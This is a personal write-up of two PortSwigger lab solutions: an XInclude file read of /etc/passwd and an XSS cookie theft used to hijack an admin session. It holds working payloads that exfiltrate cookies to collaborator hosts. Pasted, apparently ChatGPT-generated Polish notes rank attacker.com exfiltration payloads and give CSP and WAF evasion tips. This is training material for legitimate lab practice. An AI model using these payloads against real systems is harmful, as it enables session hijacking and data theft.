# burp-essential-skills
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/
<br><br>

<h3>Lab: Discovering vulnerabilities quickly with targeted scanning</h3>

<img width="1171" height="739" alt="image" src="https://github.com/user-attachments/assets/aae630f0-4e38-4b0b-9231-29e2ccffa884" />

<br><br>

<img width="745" height="515" alt="image" src="https://github.com/user-attachments/assets/b75cdfe9-1737-4c4f-aed4-dc75d1ee80ec" />

<br><br>

productId parameter is vulnerable, Url encoded payload <br>
<img width="524" height="538" alt="image" src="https://github.com/user-attachments/assets/cff3e345-aeb1-49ec-9dcd-e0787ecf53c7" />

<br><br>

repeater

<br><br>

origin payload: 
```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://c1e413cu8m75q33nafwztiesjjpad01p.oastify.com/foo"/></zyk>```

win payload:
```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>```
<br><br>

<img width="827" height="528" alt="image" src="https://github.com/user-attachments/assets/70018d9a-e786-4361-acad-2742040ce783" />

<br><br><br><br><br><br><br><br><br><br>

<h3>Lab: Scanning non-standard data structures</h3>
<br><br>
To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.
<br><br>
server said: browser, set this as a session cookie of user.
if we want to test sth, we want to test sth that is predictable.
cookies interacts with the database every time the request is send.
<br><br>
<img width="837" height="678" alt="image" src="https://github.com/user-attachments/assets/8821726f-965e-4626-aaab-fcce57d75bd8" />

<br><br>
& audit selected items. <br><br>
<img width="555" height="464" alt="image" src="https://github.com/user-attachments/assets/12d547b0-2b8a-4cab-8406-6810891f865a" />

<img width="766" height="680" alt="image" src="https://github.com/user-attachments/assets/6826ebf0-2673-4342-8115-5116637adfed" />

<br><br>
origin payload: ``` '"><svg/onload=fetch`//hcx56jcq7hqqt5jhqarhnd8ab1hw5mtej2asxil7\.oastify.com`> ```<br><br>
edit (copy own collab address): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/document.cookie`)> ```<br><br>
original cookie was url encoded so document cookie part also must be<br><br>
win payload (insert new colab payload): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/${encodeURIComponent(document.cookie)}`)>```<br><br>
<br>
<img width="833" height="574" alt="image" src="https://github.com/user-attachments/assets/5415eedf-f95a-40dd-8cd1-f7a6bc76c7bb" />

winer <br>
<img width="1086" height="709" alt="image" src="https://github.com/user-attachments/assets/80f8f0f0-2885-4369-83a1-ecbdb537ad68" />
<img width="998" height="407" alt="image" src="https://github.com/user-attachments/assets/9d211e67-a926-468d-b303-e30827ea18a9" />

<br>
in browser: delete cookies except for path / and paste admin (>admin panel>delete carlos)

<br><br>

chatgpt notes: <br>
<img width="768" height="485" alt="image" src="https://github.com/user-attachments/assets/8ab0cc1a-39b6-49c9-a4eb-ef97cb5f4f58" />

<img width="746" height="246" alt="image" src="https://github.com/user-attachments/assets/f8bada05-30b3-47b6-a537-f76c96c5b183" />

<img width="845" height="679" alt="image" src="https://github.com/user-attachments/assets/2abbda98-492a-44d1-84fb-118f58e95531" />

```🧠 Pentesterski insight

99% XSS exfil payloadów w realnych exploitach używa:

GET
img
script
link
iframe


🔎 Co znaczy „najbardziej niezawodne”

Payload jest niezawodny jeśli:

działa mimo filtrów

działa mimo CSP

działa bez JS (czasem)

nie wymaga specjalnych uprawnień

nie wywołuje błędów przeglądarki

📦 Dlaczego właśnie te elementy
1️⃣ GET

Bo:

jest domyślny

nie wymaga konfiguracji

przechodzi przez większość firewalli

nie wygląda podejrzanie w logach

2️⃣ <img>
```<img src="//attacker.com/data">```

Dlaczego jest potężny:

nie wymaga JavaScript

prawie nigdy nie jest blokowany

przeglądarka zawsze próbuje pobrać obraz

➡ działa nawet gdy:

JS zablokowany

CSP częściowo aktywny

3️⃣ <script>
```<script src="//attacker.com/x.js"></script>```

automatycznie wykonuje kod

pozwala przejąć kontrolę nad stroną

często whitelisty CSP pozwalają na CDN-y → można podszyć się pod zaufaną domenę

4️⃣ <link>
```<link rel="stylesheet" href="//attacker.com/leak">```

Przeglądarka pobierze zasób nawet jeśli:

CSS się nie użyje

request i tak poleci

5️⃣ <iframe>
```<iframe src="//attacker.com/data"></iframe>```

zawsze ładuje URL

request wychodzi natychmiast

trudny do zablokowania filtrami

🧠 Kluczowa zasada exploit dev

Dobry payload ≠ najbardziej zaawansowany
Dobry payload = najbardziej kompatybilny

Pentesterzy wybierają techniki które:

działają na największej liczbie aplikacji jednocześnie

📊 Dlaczego nie używa się „ładniejszych” metod

Np.:

```fetch("https://attacker.com", {method:"POST", body:data})```

Może zostać zablokowane przez: CSP, CORS, WAF, sandbox iframe, brak JS

Natomiast:

```<img src="//attacker.com/data">```

prawie nigdy nie.

<br><br>

Super — poniżej masz praktyczny ranking payloadów XSS używanych w realnych testach / exploitach, od najbardziej niezawodnych do najbardziej „finezyjnych”.

To jest dokładnie ten mental model, którego używają doświadczeni pentesterzy.

🏆 Ranking payloadów exfil XSS (real-world reliability)
🥇 Tier 1 — Najbardziej niezawodne (działają prawie zawsze)
1. <img src=...>
```<img src="//attacker.com?c="+document.cookie>```

✔ działa bez JS (jeśli wstrzyknięcie jest w HTML)
✔ prawie nigdy nie blokowane
✔ działa nawet przy restrykcyjnym CSP (jeśli img-src * lub brak polityki)

👉 Najczęściej używany w realnych exploitach

2. ```<script src=...>```
```<script src="//attacker.com/x.js"></script>```

✔ daje pełną kontrolę JS
✔ krótki payload
✔ automatyczne wykonanie

📌 Jeśli CSP pozwala na zewnętrzne skrypty → jackpot

3. ```<iframe src=...>```
```<iframe src="//attacker.com"></iframe>```

✔ request zawsze wychodzi
✔ często przechodzi filtry HTML sanitizerów

🥈 Tier 2 — Stabilne ale zależne od kontekstu
4. SVG event

✔ działa w wielu kontekstach
✔ omija filtry blokujące <script>

❗ wymaga JS

5. Event handlers
```<body onload=...>
<div onmouseover=...>```

✔ dobre gdy można wstrzyknąć atrybut
❗ zależy od miejsca w DOM

🥉 Tier 3 — Zaawansowane / sytuacyjne
6. fetch / XHR exfil
```fetch("//attacker.com/"+data)```

✔ czyste i eleganckie
❗ blokowane przez CSP / CORS / sandbox

7. WebSocket exfil
```new WebSocket("wss://attacker.com/"+data)```

✔ stealth
❗ często blokowane przez firewall / CSP

8. DNS exfil

np.

```<img src="//"+btoa(data)+".attacker.com">```

✔ omija monitoring HTTP
❗ ograniczona długość danych

🧠 Dlaczego Tier 1 wygrywa w realnym świecie

Bo są odporne na:

zabezpieczenie	czy przejdzie img?
WAF	często tak
CSP	często tak
brak JS	tak
filtry HTML	często tak
sandbox	czasem tak


📊 Mentalna checklista pentestera

Gdy masz XSS, testujesz kolejno:

1️⃣ <img>
2️⃣ <script src>
3️⃣ SVG event
4️⃣ fetch/XHR
5️⃣ exotic bypass

⭐ Sekret senior pentesterów

Najlepsi testerzy zaczynają od najprostszych payloadów.

